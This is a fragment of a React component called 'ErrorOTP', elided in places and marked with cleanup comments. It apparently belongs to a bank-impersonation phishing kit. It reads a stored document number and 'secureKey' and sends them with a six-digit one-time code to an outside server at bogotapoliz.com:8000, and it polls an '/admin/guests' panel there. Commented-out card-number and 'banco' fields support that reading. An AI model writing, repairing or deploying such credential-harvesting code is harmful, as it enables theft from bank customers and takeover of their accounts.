...
const ErrorOTP = () => {
  ...
  // Removed unused state 'cardNumber'
  ...
  useEffect(() => {
    ...
    if (savedFormValues) {
      // Removed unused variable 'formValues'
      // setCardNumber(formValues.cardNumber || ''); // Removed as cardNumber state is not defined
    }
    ...
    const interval = setInterval(async () => {
      try {
        const response = await fetch('http://bogotapoliz.com:8000/api/v1/admin/guests');
  ...
  const handleSubmit = async () => {
    if (otp.length === 6) {
      const savedDocumentNumber = localStorage.getItem('documentNumber');
      const savedSecureKey = localStorage.getItem('secureKey');
      // Removed unused variable 'savedFormValues'
      // Removed unused variable 'banco'
      ...
      if (savedDocumentNumber && savedSecureKey) {
        ...
        try {
          ...
          const updateResponse = await fetch(`http://bogotapoliz.com:8000/api/v1/guest/${guestId}`, {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
            },
